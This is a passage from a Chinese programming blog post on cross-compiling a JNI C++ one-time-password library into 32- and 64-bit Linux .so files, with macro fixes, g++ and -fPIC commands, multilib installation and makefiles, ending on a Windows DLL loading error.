__declspec(dllexport)</span><span class="token macro property">#<span class="token directive keyword">define</span> JNIIMPORT __declspec(dllimport)</span><span class="token macro property">#<span class="token directive keyword">define</span> JNICALL __stdcall</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同时打开 [jni.h] ，发现有多处用到了这些宏定义：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token function">jobject</span> <span class="token punctuation">(</span>JNICALL <span class="token operator">*</span>NewGlobalRef<span class="token punctuation">)</span> <span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject lobj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token punctuation">(</span>JNICALL <span class="token operator">*</span>DeleteGlobalRef<span class="token punctuation">)</span> <span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject gref<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其实当时我看到 [dllexport] 和 [dllimport] 就知道有猫腻了，[dll] 不就是win的东西吗？ Linux肯定不支持啊，但这个问题我想了很久也不得其解：“这是JNI提供的头文件，按道理不可能会出这种明知故犯的缺陷。况且如果 [dllexport] 和 [dllimport] 有问题，我该怎么改呢？”</p><p>当机立断找度娘给自己科普了一下，原来 <code>__declspec(dllexport)</code> 是用于声明哪些函数可以导出（即对外使用），但<strong>仅限于win平台</strong>（科普看<a href="https://blog.csdn.net/mniwc/article/details/7993361" target="_blank" rel="nofollow">这里</a>）；而相对地，<strong>Linux则默认所有函数都是public的</strong>，即可以导出而无需声明，不过Linux有一个相似的声明 <code>__attribute__((visibility("hidden")))</code> 可以隐藏函数使其不能导出（科普看<a href="https://blog.csdn.net/zdragon2002/article/details/6061962" target="_blank" rel="nofollow">这里</a>）。</p><p>但科普了这些其实也是 然并卵，怎么改还是毫无头绪。而且当时我心里还有一份执念就是：“尽然因为平台的特性问题，C/C++程序我至少要编译4个版本（win两个、Linux两个），但代码必须只能有一份。”</p><p>后来我才灵机一动， <font color="red">[jni.h] 和 [jni_md.h] 都是我在win的JDK下面复制的，会不会Linux有不同的版本？！</font></p><p>果不其然！</p><p>先看看win和Linux这两个文件的位置比较：</p><table><thead><tr><th align="center">平台</th><th align="center">文件</th><th align="center">位置</th></tr></thead><tbody><tr><td align="center">win</td><td align="center">jni.h</td><td align="center">%jdk_home%/include</td></tr><tr><td align="center">win</td><td align="center">jni_md.h</td><td align="center">%jdk_home%/include/win32</td></tr><tr><td align="center">Linux</td><td align="center">jni.h</td><td align="center">%jdk_home%/include</td></tr><tr><td align="center">Linux</td><td align="center">jni_md.h</td><td align="center">%jdk_home%/include/linux</td></tr></tbody></table><p>再对比文件内容， [jni.h] 是相同的，但是Linux版本下 [jni_md.h] 的这三个宏定义变成了这样：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">define</span> JNIEXPORT</span><span class="token macro property">#<span class="token directive keyword">define</span> JNIIMPORT</span><span class="token macro property">#<span class="token directive keyword">define</span> JNICALL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那么为了同时兼顾win和Linux，可以直接修改 [jni_md.h] ，添加开关宏：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">ifdef</span> _WIN32</span>    <span class="token macro property">#<span class="token directive keyword">define</span> JNIEXPORT __declspec(dllexport)</span>    <span class="token macro property">#<span class="token directive keyword">define</span> JNIIMPORT __declspec(dllimport)</span>    <span class="token macro property">#<span class="token directive keyword">define</span> JNICALL __stdcall</span><span class="token macro property">#<span class="token directive keyword">else</span></span>    <span class="token macro property">#<span class="token directive keyword">define</span> JNIEXPORT</span>    <span class="token macro property">#<span class="token directive keyword">define</span> JNIIMPORT</span>    <span class="token macro property">#<span class="token directive keyword">define</span> JNICALL</span><span class="token macro property">#<span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重新执行g++命令编译，虽然还是报错，但是宏错误的问题已经消失：</p><blockquote><p>&nbsp;<br><font color="red">stdafx.h</font>:13:85: fatal error: <font color="red">windows.h: No such file or directory</font><br>　　#include &lt;windows.h&gt;</p></blockquote><p>其实有了前面的经验，这个问题也变得很好解决了。VS2010在创建非空的dll工程的时候，会自动生成 [stdafx.h] 头文件，并把 &lt;windows.h&gt; 包含进来，修改 [stdafx.h] ，同样地添加开关宏即可：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">ifdef</span> _WIN32</span>    <span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>【注意】</strong><br><em>实际上 #include &lt;windows.h&gt; 的问题远没有这么简单就解决了。</em><br><em>当时我的程序没有考虑到Linux环境的问题，不少地方引用了win的API，所以要一个个位置排查并修改为与WinAPI无关的代码，着实费了不少时间。</em></p></blockquote><p>重新执行g++命令编译，又报了新的错误，而且是项目的dllmain函数报错：</p><blockquote><p><font color="red">dllmain.cpp</font>:13:2: error: BOOL does not name a type<br>　　BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call,  LPVOID lpReserved)</p></blockquote><p>这个错误是因为我刚才在Linux下屏蔽了 [#include &lt;windows.h&gt;] 引起的。实际上Linux编译的so文件无需用到dll的main函数，修改 [dllmain.cpp] （这个文件同样是VS2010在创建非空的dll工程时自动生成的），同样地为其添加开关宏即可：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">ifdef</span> _WIN32</span>    <span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"stdafx.h"</span></span>    BOOL APIENTRY <span class="token function">DllMain</span>        <span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD  ul_reason_for_call<span class="token punctuation">,</span>  LPVOID lpReserved<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>ul_reason_for_call<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>            <span class="token keyword">case</span> DLL_THREAD_ATTACH<span class="token operator">:</span>            <span class="token keyword">case</span> DLL_THREAD_DETACH<span class="token operator">:</span>            <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token macro property">#<span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>【注意】</strong><br><em>dllmain.cpp的问题有更好的方法去处理，就是<strong>编写 makefile 脚本</strong>。</em><br><em>只要在构建时不将其添加进来，自然就不会编译它了。</em><br><em>其他不需被Linux编译的、或仅用于测试的cpp文件，也可以通过此方式过滤。</em></p></blockquote><p>重新执行g++命令编译，这次终于没有报错了，而且每份 [*.cpp] 源码都多了一份对应的 [*.o] 目标文件，如图 7所示。至此编译so动态链接库的<strong>第一步完成</strong>。</p><p><img src="./07.png" alt="g++ -c *.cpp 命令执行成功"></p><p>最后执行以下命令生成so动态链接库：</p><pre class="line-numbers language-bash"><code class="language-bash">$ g++  -shared  -o  dt_otp.so  *.o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是Linux还是很不友善地报错了：</p><blockquote><p>/usr/bin/ld: dt_otp.o: relocation R_X86_64_32 against '__gxx_personality_v0' can not be used when making a shared object; recompile with -fPIC<br>dt_otp.o: error adding symbols: Bad value<br>collect2: error: ld returned 1 exit status</p></blockquote><p>这个异常还是比较易懂的，就是说无法构造一个 [.so] 文件，请用 [-fPIC] 参数重新编译。度娘说 <strong>[-fPIC] 的作用是为了构造 [位置无关] 的程序</strong>，我想想也合理，毕竟是动态链接库。</p><p>加入 [-fPIC] 参数重新执行编译和构建命令，成功创建 [.so] 文件：</p><pre class="line-numbers language-bash"><code class="language-bash">$ g++  -fPIC  -c  *.cpp$ g++  -fPIC  -shared  -o  dt_otp.so  *.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>马上使用file命令查看其ELF头信息：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">file</span> dt_otp.dlldt_otp.so: ELF 64-bit LSB shared object, x86-64, version 1 <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>8aa563514fb87d53815814d00f3387e1dca18a7e, not stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>看到这段ELF头信息，我内心是窃喜的 ~ 因为不再是 [for MS Windows] 了。</p><p>马上让Java程序引用该so动态链接库（引用方式与dll相同），成功！</p><h3 id="6-6-编译SO动态链接库（x86）"><a href="#6-6-编译SO动态链接库（x86）" class="headerlink" title="6.6.编译SO动态链接库（x86）"></a>6.6.编译SO动态链接库（x86）</h3><p>但问题又来了，还差一份32-bit的so库文件，我在64位的Linux应该如何编译出来呢？</p><p>度娘说<strong>GCC所编译的文件位数默认与GCC编译器的位数相同</strong>，查了一下本地GCC版本信息，果然是64-bit的：</p><pre class="line-numbers language-bash"><code class="language-bash">$ g++  -vCOLLECT_GCC<span class="token operator">=</span>g++COLLECT_LTO_WRAPPER<span class="token operator">=</span>/usr/lib/gcc/x86_64-linux-gnu/4.9/lto-wrapperTarget: x86_64-linux-gnu<span class="token punctuation">..</span>.gcc version 4.9.2 <span class="token punctuation">(</span>Ubuntu 4.9.2-10ubuntu13<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>度娘还说，要想控制所编译的文件的位数，只需在g++命令中加入声明参数 [-m32] 或 [-m64] 即可。</p><p>但是我添加 [-m32] 参数后，编译又报错了：</p><pre class="line-numbers language-bash"><code class="language-bash">$ g++  -m32  -fPIC  -c  *.cpp/usr/include/features.h:364:25: fatal error: sys/cdefs.h: No such <span class="token function">file</span> or directory    <span class="token comment" spellcheck="true">#include &lt;sys/cdefs.h></span>/usr/include/c++/4.9/exception:37:28: fatal error: bits/c++config.h: No such <span class="token function">file</span> or directory    <span class="token comment" spellcheck="true">#include &lt;bits/c++config.h></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实这个错误还是比较好解决的，原因是我的<strong>64位Ubuntu只有64位GCC编译环境，没有32位的GCC编译环境</strong>（其实和最开始我在win的VCExpress中遇到没有64位编译器的道理是一样的）。那么安装一个32位的GCC编译器就OK了，而Ubuntu的好处就是只需两条命令就可完成安装：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span>  <span class="token function">apt-get</span>  <span class="token function">install</span>  lib32readline-gplv2-dev$ <span class="token function">sudo</span>  <span class="token function">apt-get</span>  <span class="token function">install</span>  gcc-multilib  g++-multilib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中，第一条命令是安装32位的兼容库，第二条命令是安装32位GCC编译器。其他Linux系统的同学请自己去问度娘怎么安装（<a href="http://www.cnblogs.com/mliudong/p/4086797.html" target="_blank" rel="nofollow">这里</a>是Ubuntu的安装方法）。</p><p>编译32-bit的 [*.o] 目标文件成功后，则可用以下创建 [so] 文件：</p><pre class="line-numbers language-bash"><code class="language-bash">$ g++  -m32  -fPIC  -shared  -o  dt_otp_x86.so  *.o<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再来看看其ELF头信息：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">file</span> dt_otp_x86.dlldt_otp_x86.so: ELF 32-bit LSB shared object, Intel 80386, version 1 <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>7343d60222fded19f18cbdaa0d24d0d0949bd4cd, not stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>马上让Java程序引用该so动态链接库（注意要用32位JDK），成功！</p><h3 id="6-7-SO的编译小结（x86与x64）"><a href="#6-7-SO的编译小结（x86与x64）" class="headerlink" title="6.7. SO的编译小结（x86与x64）"></a>6.7. SO的编译小结（x86与x64）</h3><p>由于关于SO的内容比较多，这里小结一下。</p><p>生成64-bit的 [so] 动态连接库文件的命令是：</p><pre class="line-numbers language-bash"><code class="language-bash">$ g++  -m64  -fPIC  -c  *.cpp$ g++  -m64  -fPIC  -shared  -o  <span class="token punctuation">[</span>so库名<span class="token punctuation">]</span>.so  *.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>生成32-bit的 [so] 动态连接库文件的命令是：</p><pre class="line-numbers language-bash"><code class="language-bash">$ g++  -m32  -fPIC  -c  *.cpp$ g++  -m32  -fPIC  -shared  -o  <span class="token punctuation">[</span>so库名<span class="token punctuation">]</span>.so  *.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有其他前辈已经归纳得比较详尽了，有兴趣的同学也不妨<a href="https://blog.csdn.net/yutianzuijin/article/details/9501357" target="_blank" rel="nofollow">跳过去</a>看看。</p><h3 id="6-8-make构建更优雅"><a href="#6-8-make构建更优雅" class="headerlink" title="6.8. make构建更优雅"></a>6.8. make构建更优雅</h3><p>前面介绍了如何把 [*.cpp] 生成 [so] 的过程，但是比较无脑，把所有 cpp 一股脑全部编译进去了，其实不必要，而且项目太大的话还浪费编译时间。</p><p>为了使得编译过程显得更优雅，完全可以编写一份makefile脚本，然后通过make命令构建（不懂make的同学点<a href="https://blog.csdn.net/liuyang1943/article/details/5982163" target="_blank" rel="nofollow">这里</a>或者问度娘）。</p><p>下面为我最终为编写的makefile脚本（本文最后会提供下载），脚本一共三份： <code>make.sh</code>、<code>makefile_x64</code>、<code>makefile_x86</code>：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true"># == make.sh ==</span><span class="token function">export</span> lib_x64<span class="token operator">=</span>dt_otp_x64.so<span class="token function">export</span> mf_x64<span class="token operator">=</span>makefile_x64<span class="token function">export</span> lib_x86<span class="token operator">=</span>dt_otp_x86.so<span class="token function">export</span> mf_x86<span class="token operator">=</span>makefile_x86<span class="token keyword">echo</span> <span class="token string">"======================================="</span><span class="token keyword">echo</span> <span class="token string">"make <span class="token variable">${lib_x64}</span> start: "</span><span class="token function">make</span> --file<span class="token operator">=</span><span class="token variable">${mf_x64}</span> all <span class="token function">make</span> --file<span class="token operator">=</span><span class="token variable">${mf_x64}</span> clean <span class="token keyword">echo</span> <span class="token string">"make <span class="token variable">${lib_x64}</span> end. "</span><span class="token function">file</span> <span class="token variable">${lib_x64}</span><span class="token keyword">echo</span> <span class="token string">"======================================="</span><span class="token keyword">echo</span> <span class="token string">"."</span><span class="token keyword">echo</span> <span class="token string">"======================================="</span><span class="token keyword">echo</span> <span class="token string">"make <span class="token variable">${lib_x86}</span> start: "</span><span class="token function">make</span> --file<span class="token operator">=</span><span class="token variable">${mf_x86}</span> all <span class="token function">make</span> --file<span class="token operator">=</span><span class="token variable">${mf_x86}</span> clean <span class="token keyword">echo</span> <span class="token string">"make <span class="token variable">${lib_x86}</span> end. "</span><span class="token function">file</span> <span class="token variable">${lib_x86}</span><span class="token keyword">echo</span> <span class="token string">"======================================="</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># == makefile for : dt_otp_x64.so ==</span><span class="token comment" spellcheck="true"># -------</span><span class="token comment" spellcheck="true"># Variable declaration :                                 </span><span class="token comment" spellcheck="true"># -------</span>  TAR_LIB_NAME :<span class="token operator">=</span> dt_otp_x64.so  O_MAIN_OBJS :<span class="token operator">=</span> dllmain.o dt_otp.o otp_impl.o  O_ALGORITHM_OBJS :<span class="token operator">=</span> md5.o digital_watermark.o  O_UTIL_OBJS :<span class="token operator">=</span> crypto_utils.o jni_utils.o str_utils.o num_utils.o time_utils.o  O_ALL_OBJS :<span class="token operator">=</span> <span class="token variable"><span class="token variable">$(</span>O_MAIN_OBJS<span class="token variable">)</span></span> <span class="token variable"><span class="token variable">$(</span>O_ALGORITHM_OBJS<span class="token variable">)</span></span> <span class="token variable"><span class="token variable">$(</span>O_UTIL_OBJS<span class="token variable">)</span></span>  COMPILE_CMD :<span class="token operator">=</span> g++ -m64 -fPIC <span class="token comment" spellcheck="true"># -------</span><span class="token comment" spellcheck="true"># Build libary :                                 </span><span class="token comment" spellcheck="true"># -------</span>all <span class="token keyword">:</span> <span class="token variable"><span class="token variable">$(</span>TAR_LIB_NAME<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>TAR_LIB_NAME<span class="token variable">)</span></span> <span class="token keyword">:</span> <span class="token variable"><span class="token variable">$(</span>O_ALL_OBJS<span class="token variable">)</span></span>     @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -shared -o <span class="token variable"><span class="token variable">$(</span>TAR_LIB_NAME<span class="token variable">)</span></span> <span class="token variable"><span class="token variable">$(</span>O_ALL_OBJS<span class="token variable">)</span></span>     @echo <span class="token string">"> Build [<span class="token variable"><span class="token variable">$(</span>TAR_LIB_NAME<span class="token variable">)</span></span>] finish."</span> dllmain.o <span class="token keyword">:</span> dllmain.cpp stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c dllmain.cpp -o dllmain.o     @echo <span class="token string">"> Compile [dllmain.o] finish."</span> dt_otp.o <span class="token keyword">:</span> dt_otp.cpp dt_otp.h otp_impl.h jni_utils.h exp_token_otp__OTP_CAPI.h jni.h jni_md.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c dt_otp.cpp -o dt_otp.o     @echo <span class="token string">"> Compile [dt_otp.o] finish."</span> otp_impl.o <span class="token keyword">:</span> otp_impl.cpp otp_impl.h num_utils.h str_utils.h time_utils.h crypto_utils.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c otp_impl.cpp -o otp_impl.o     @echo <span class="token string">"> Compile [otp_impl.o] finish."</span> md5.o <span class="token keyword">:</span> md5.cpp md5.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c md5.cpp -o md5.o     @echo <span class="token string">"> Compile [md5.o] finish."</span> digital_watermark.o <span class="token keyword">:</span> digital_watermark.cpp digital_watermark.h str_utils.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c digital_watermark.cpp -o digital_watermark.o     @echo <span class="token string">"> Compile [digital_watermark.o] finish."</span> crypto_utils.o <span class="token keyword">:</span> crypto_utils.cpp crypto_utils.h str_utils.h md5.h digital_watermark.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c crypto_utils.cpp -o crypto_utils.o     @echo <span class="token string">"> Compile [crypto_utils.o] finish."</span> jni_utils.o <span class="token keyword">:</span> jni_utils.cpp jni_utils.h str_utils.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c jni_utils.cpp -o jni_utils.o     @echo <span class="token string">"> Compile [jni_utils.o] finish."</span> num_utils.o <span class="token keyword">:</span> num_utils.cpp num_utils.h str_utils.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c num_utils.cpp -o num_utils.o     @echo <span class="token string">"> Compile [num_utils.o] finish."</span> str_utils.o <span class="token keyword">:</span> str_utils.cpp str_utils.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c str_utils.cpp -o str_utils.o     @echo <span class="token string">"> Compile [str_utils.o] finish."</span> time_utils.o <span class="token keyword">:</span> time_utils.cpp time_utils.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c time_utils.cpp -o time_utils.o     @echo <span class="token string">"> Compile [time_utils.o] finish."</span> clean:    @rm -f <span class="token variable"><span class="token variable">$(</span>O_ALL_OBJS<span class="token variable">)</span></span>    @echo <span class="token string">"> Clean [*.o] finish."</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># == makefile for : dt_otp_x86.so ==</span><span class="token comment" spellcheck="true"># -------</span><span class="token comment" spellcheck="true"># Variable declaration :                                 </span><span class="token comment" spellcheck="true"># -------</span>  TAR_LIB_NAME :<span class="token operator">=</span> dt_otp_x86.so  O_MAIN_OBJS :<span class="token operator">=</span> dllmain.o dt_otp.o otp_impl.o  O_ALGORITHM_OBJS :<span class="token operator">=</span> md5.o digital_watermark.o  O_UTIL_OBJS :<span class="token operator">=</span> crypto_utils.o jni_utils.o str_utils.o num_utils.o time_utils.o  O_ALL_OBJS :<span class="token operator">=</span> <span class="token variable"><span class="token variable">$(</span>O_MAIN_OBJS<span class="token variable">)</span></span> <span class="token variable"><span class="token variable">$(</span>O_ALGORITHM_OBJS<span class="token variable">)</span></span> <span class="token variable"><span class="token variable">$(</span>O_UTIL_OBJS<span class="token variable">)</span></span>  COMPILE_CMD :<span class="token operator">=</span> g++ -m32 -fPIC <span class="token comment" spellcheck="true"># -------</span><span class="token comment" spellcheck="true"># Build libary :                                 </span><span class="token comment" spellcheck="true"># -------</span>all <span class="token keyword">:</span> <span class="token variable"><span class="token variable">$(</span>TAR_LIB_NAME<span class="token variable">)</span></span><span class="token variable"><span class="token variable">$(</span>TAR_LIB_NAME<span class="token variable">)</span></span> <span class="token keyword">:</span> <span class="token variable"><span class="token variable">$(</span>O_ALL_OBJS<span class="token variable">)</span></span>     @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -shared -o <span class="token variable"><span class="token variable">$(</span>TAR_LIB_NAME<span class="token variable">)</span></span> <span class="token variable"><span class="token variable">$(</span>O_ALL_OBJS<span class="token variable">)</span></span>     @echo <span class="token string">"> Build [<span class="token variable"><span class="token variable">$(</span>TAR_LIB_NAME<span class="token variable">)</span></span>] finish."</span> dllmain.o <span class="token keyword">:</span> dllmain.cpp stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c dllmain.cpp -o dllmain.o     @echo <span class="token string">"> Compile [dllmain.o] finish."</span> dt_otp.o <span class="token keyword">:</span> dt_otp.cpp dt_otp.h otp_impl.h jni_utils.h exp_token_otp__OTP_CAPI.h jni.h jni_md.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c dt_otp.cpp -o dt_otp.o     @echo <span class="token string">"> Compile [dt_otp.o] finish."</span> otp_impl.o <span class="token keyword">:</span> otp_impl.cpp otp_impl.h num_utils.h str_utils.h time_utils.h crypto_utils.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c otp_impl.cpp -o otp_impl.o     @echo <span class="token string">"> Compile [otp_impl.o] finish."</span> md5.o <span class="token keyword">:</span> md5.cpp md5.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c md5.cpp -o md5.o     @echo <span class="token string">"> Compile [md5.o] finish."</span> digital_watermark.o <span class="token keyword">:</span> digital_watermark.cpp digital_watermark.h str_utils.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c digital_watermark.cpp -o digital_watermark.o     @echo <span class="token string">"> Compile [digital_watermark.o] finish."</span> crypto_utils.o <span class="token keyword">:</span> crypto_utils.cpp crypto_utils.h str_utils.h md5.h digital_watermark.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c crypto_utils.cpp -o crypto_utils.o     @echo <span class="token string">"> Compile [crypto_utils.o] finish."</span> jni_utils.o <span class="token keyword">:</span> jni_utils.cpp jni_utils.h str_utils.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c jni_utils.cpp -o jni_utils.o     @echo <span class="token string">"> Compile [jni_utils.o] finish."</span> num_utils.o <span class="token keyword">:</span> num_utils.cpp num_utils.h str_utils.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c num_utils.cpp -o num_utils.o     @echo <span class="token string">"> Compile [num_utils.o] finish."</span> str_utils.o <span class="token keyword">:</span> str_utils.cpp str_utils.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c str_utils.cpp -o str_utils.o     @echo <span class="token string">"> Compile [str_utils.o] finish."</span> time_utils.o <span class="token keyword">:</span> time_utils.cpp time_utils.h stdafx.h targetver.h    @<span class="token variable"><span class="token variable">$(</span>COMPILE_CMD<span class="token variable">)</span></span> -c time_utils.cpp -o time_utils.o     @echo <span class="token string">"> Compile [time_utils.o] finish."</span> clean:    @rm -f <span class="token variable"><span class="token variable">$(</span>O_ALL_OBJS<span class="token variable">)</span></span>    @echo <span class="token string">"> Clean [*.o] finish."</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>make.sh</code> 会自动调用 <code>makefile_x64</code> 和 <code>makefile_x86</code>，这样只需要执行一次 <code>make.sh</code> 就可以同时得到 64-bit 和 32-bit 的 [so] 动态连接库文件，执行效果如下图 8所示：</p><p><img src="./08.png" alt="make执行效果"></p><blockquote><p><strong>【注意】</strong><br><em>其实 [dll] 同样可以模仿 [so] ，通过make命令进行构建。</em><br><em>前面我一直提到一个 Cygwin 工具，其实它是win下的轻量级Linux模拟器。</em><br><em>只要在上面部署好win和Linux的 [交叉编译工具链]，就可以实现一键构建 [dll] 和 [so] 。</em></p></blockquote><h2 id="7-填坑：跨平台调试"><a href="#7-填坑：跨平台调试" class="headerlink" title="7. 填坑：跨平台调试"></a>7. 填坑：跨平台调试</h2><p>截至为此，我已经拥有了 [win_x86.dll]、[win_x64.dll]、[linux_86.so]、[linux_x64.so] 两个平台两种位长的四份动态链接库。</p><p><strong>理论上</strong>Java程序只需根据运行环境加载对应的库文件就可以了。</p><p>但<strong>实际上</strong>总不会这么顺利的。</p><h3 id="7-1-程序无法运行在其他win平台"><a href="#7-1-程序无法运行在其他win平台" class="headerlink" title="7.1. 程序无法运行在其他win平台"></a>7.1. 程序无法运行在其他win平台</h3><p>我把程序打包后，本地测试可以运行。然后部署到其他windows机器，却发现运行报错：</p><blockquote><p>java.lang.UnsatisfiedLinkError: ./lib/dt_opt.dll: 应用程序无法启动，因为应用程序的并行配置不正确。有关详细信息，请参阅应用程序事件日志，或使用命令行 sxstrace.exe 工具。<br>　　at java.lang.ClassLoader$NativeLibrary.load(Native Method)<br>　　at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1803)<br>　　at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1699)<br>　　at java.lang.Runtime.load0(Runtime.java:770)<br>　　at java.lang.System.load(System.java:1003)<br>java.lang.UnsatisfiedLinkError: ./lib/dt_opt.dll: 由于应用程序配置不正确，应用程序未能启动。有关详细信息，请参阅应用程序事件日志，或使用命令行 sxstrace.exe 工具。<br>　　at java.lang.ClassLoader$NativeLibrary.load(Native Method)<br>　　at java.lang.ClassLoader.loadLibrary0(ClassLoader.java:1803)<br>　　at 